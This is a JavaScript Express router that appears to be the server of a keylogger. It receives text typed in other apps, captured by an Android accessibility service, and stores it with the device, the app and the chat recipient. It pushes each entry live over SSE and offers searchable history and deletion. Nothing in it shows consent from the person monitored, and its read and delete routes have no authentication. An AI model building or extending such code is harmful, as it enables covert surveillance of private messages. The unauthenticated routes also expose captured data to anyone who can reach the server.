import { Router } from 'express'
import { db } from '../db/client.js'
import { broadcast } from '../sse.js'
import { TEXT_ROLE_PRIORITY } from '../appRoles.js'

const router = Router()
const IGNORED_TYPED_TEXT = new Set([
    'message',
    'type a message',
    'write a message',
    'send a message',
    'ask google',
])
const TARGET_INHERIT_MINUTES = 90

function normalizeTypedText(value) {
    return String(value ?? '').trim().toLowerCase().replace(/\s+/g, ' ').replace(/[.!?…]+$/g, '')
}

// POST /api/typed-text — called by the Android accessibility service
router.post('/', async (req, res) => {
    const { deviceId, packageName, appLabel, targetName, text, capturedAt, appRole } = req.body

    if (!deviceId || !packageName || !text || !capturedAt) {
        return res.status(400).json({ error: 'Missing required fields: deviceId, packageName, text, capturedAt' })
    }
    if (appRole && !TEXT_ROLE_PRIORITY.includes(appRole)) {
        return res.status(400).json({ error: 'Unknown appRole' })
    }
    if (IGNORED_TYPED_TEXT.has(normalizeTypedText(text))) {
        return res.status(202).json({ status: 'ignored' })
    }

    try {
        let effectiveTarget = targetName ?? ''
        if (!String(effectiveTarget).trim()) {
            const captured = new Date(capturedAt)
            if (!Number.isNaN(captured.getTime())) {
                const inherited = await db.query(
                    `SELECT target_name
                       FROM typed_text
                      WHERE device_id = $1 AND package_name = $2
                        AND coalesce(target_name, '') <> ''
                        AND captured_at >= $3::timestamptz - make_interval(mins => $4)
                        AND captured_at < $3::timestamptz
                      ORDER BY captured_at DESC
                      LIMIT 1`,
                    [deviceId, packageName, captured.toISOString(), TARGET_INHERIT_MINUTES]
                )
                effectiveTarget = inherited.rows[0]?.target_name ?? ''
            }
        }

        const result = await db.query(
            `INSERT INTO typed_text (device_id, package_name, app_label, target_name, text, captured_at)
             VALUES ($1, $2, $3, $4, $5, $6)
             RETURNING id, device_id, package_name, app_label, target_name, text, captured_at, received_at`,
            [deviceId, packageName, appLabel ?? '', effectiveTarget, text, capturedAt]
        )
        const row = result.rows[0]
        broadcast('typedtext', row)
        return res.status(201).json({ id: row.id, status: 'created' })
    } catch (err) {
        console.error('POST /api/typed-text error:', err.message)
        return res.status(500).json({ error: 'Internal server error' })
    }
})

// GET /api/typed-text — paginated history for later usage
router.get('/', async (req, res) => {
    const limit  = Math.min(200, Math.max(1, parseInt(req.query.limit ?? '50')))
    const offset = Math.max(0, parseInt(req.query.offset ?? '0'))
    const device = req.query.device  || null
    const pkg    = req.query.package || null
    const search = req.query.search  || null

    const conditions = []
    const params = []

    if (device) {
        params.push(device)
        conditions.push(`device_id = $${params.length}`)
    }
    if (pkg) {
        params.push(pkg)
        conditions.push(`package_name = $${params.length}`)
    }
    if (search) {
        params.push(`%${search}%`)
        conditions.push(`(text ILIKE $${params.length} OR target_name ILIKE $${params.length} OR app_label ILIKE $${params.length} OR package_name ILIKE $${params.length})`)
    }

    const where = conditions.length ? `WHERE ${conditions.join(' AND ')}` : ''

    try {
        const [dataResult, countResult] = await Promise.all([
            db.query(
                `SELECT id, device_id, package_name, app_label, target_name, text, captured_at, received_at
                 FROM typed_text
                 ${where}
                 ORDER BY captured_at DESC, received_at DESC
                 LIMIT $${params.length + 1} OFFSET $${params.length + 2}`,
                [...params, limit, offset]
            ),
            db.query(`SELECT COUNT(*) FROM typed_text ${where}`, params)
        ])

        const total = parseInt(countResult.rows[0].count)
        return res.json({
            data: dataResult.rows,
            pagination: { limit, offset, total, hasMore: offset + limit < total }
        })
    } catch (err) {
        console.error('GET /api/typed-text error:', err.message)
        return res.status(500).json({ error: 'Internal server error' })
    }
})

// DELETE /api/typed-text — bulk hard-delete by id list
router.delete('/', async (req, res) => {
    const { ids } = req.body ?? {}
    if (!Array.isArray(ids) || ids.length === 0) return res.status(400).json({ error: 'ids array required' })
    try {
        const result = await db.query('DELETE FROM typed_text WHERE id = ANY($1::bigint[])', [ids])
        broadcast('typedtext:deleted', { ids })
        return res.json({ deleted: result.rowCount })
    } catch (err) {
        console.error('DELETE /api/typed-text error:', err.message)
        return res.status(500).json({ error: 'Internal server error' })
    }
})

export default router
